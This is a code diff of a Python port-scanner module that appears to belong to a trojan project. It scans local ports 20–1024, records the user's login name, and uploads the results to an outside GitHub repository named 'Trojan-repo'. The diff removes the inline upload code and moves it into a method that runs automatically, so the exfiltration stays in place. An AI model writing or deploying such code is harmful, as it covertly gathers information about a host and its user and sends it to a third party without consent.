@@ -1,104 +1,43 @@
 import socket
-import threading
-import os
 import json
-import requests
-import base64
-from datetime import datetime
-from dotenv import load_dotenv
+import threading
+from test_main import SecurityTool
 
-class Portscan:
+
+class Portscan(SecurityTool):
     def __init__(self, timeout=1):
+        super().__init__()
         self.timeout = timeout
-        self.open_ports = []  # List of open ports
-        self.lock = threading.Lock()  # Lock for thread-safe access to open_ports
+        self.open_ports = []
+        self.lock = threading.Lock()
 
     def scan_port(self, target_ip, port):
-        """Scan a single port and add it to the list of open ports if it's open."""
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.settimeout(self.timeout)
                 result = s.connect_ex((target_ip, port))
-                if result == 0:  # Port is open
-                    with self.lock:  # Ensure thread-safe access to the list
+                if result == 0:
+                    with self.lock:
                         self.open_ports.append(port)
         except Exception:
             pass
 
     def scan(self, target_ip, ports):
-        """
-        Scans the specified ports on a given target IP address using multiple threads.
-        """
         threads = []
-
-        # Start a new thread for each port
         for port in ports:
             thread = threading.Thread(target=self.scan_port, args=(target_ip, port))
             threads.append(thread)
             thread.start()
-
-        # Wait for all threads to finish
         for thread in threads:
             thread.join()
-
         return self.open_ports
 
-# Create an instance of the Portscan class
-security_tool = Portscan()
+    def save_and_upload(self, target_ip):
+        data = {"target_ip": target_ip, "open_ports": self.open_ports}
+        file_path = f"data/portscan_{self.username}_{self.current_time}.json"
+        self.push_to_github(file_path, json.dumps(data, indent=4), "Portscan results")
 
-# Example of the Portscan module
-target_ip = "127.0.0.1"
-ports = range(20, 1025)
-print("Scanning ports...")
-open_ports = security_tool.scan(target_ip, ports)
 
-# Print the open ports
-print(f"Open ports: {open_ports}")
-
-# Prepare the data to be uploaded
-username = os.environ.get("USER") or os.environ.get("USERNAME") or "Unknown"
-current_time = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-file_path = f"data/portscan_{username}_{current_time}.json"  # Dynamic file path
-data = {"target_ip": target_ip, "open_ports": open_ports}
-file_content = json.dumps(data, indent=4)  # Convert dict to JSON string for GitHub
-
-# GitHub repository details
-repository_owner = "BlertaJashanica"
-repository_name = "Trojan-repo"
-
-load_dotenv()  # Load environment variables from .env file
-github_token = os.getenv("GITHUB_TOKEN")
-
-commit_message = f"Portscan results for {username} at {current_time}"
-
-# GitHub API URL
-api_url = f"https://api.github.com/repos/{repository_owner}/{repository_name}/contents/{file_path}"
-headers = {
-    "Authorization": f"Token {github_token}",
-    "Accept": "application/vnd.github.v3+json"
-}
-
-# Encode the file content to Base64
-file_content_encoded = base64.b64encode(file_content.encode()).decode()
-
-# Check if the file already exists
-response = requests.get(api_url, headers=headers)
-if response.status_code == 200:
-    current_file = response.json()
-    sha = current_file["sha"]  # Get the current file's SHA for updates
-else:
-    sha = None  # File doesn't exist; it will be created
-
-# Prepare the payload for the PUT request
-payload = {
-    "message": commit_message,
-    "content": file_content_encoded,
-    "sha": sha
-}
-
-# Push the file to GitHub
-response = requests.put(api_url, json=payload, headers=headers)
-if response.status_code in [200, 201]:
-    print("File pushed successfully!")
-else:
-    print("An error occurred while pushing the file:", response.json())
+portscan = Portscan()
+open_ports = portscan.scan("127.0.0.1", range(20, 1025))
+portscan.save_and_upload("127.0.0.1")
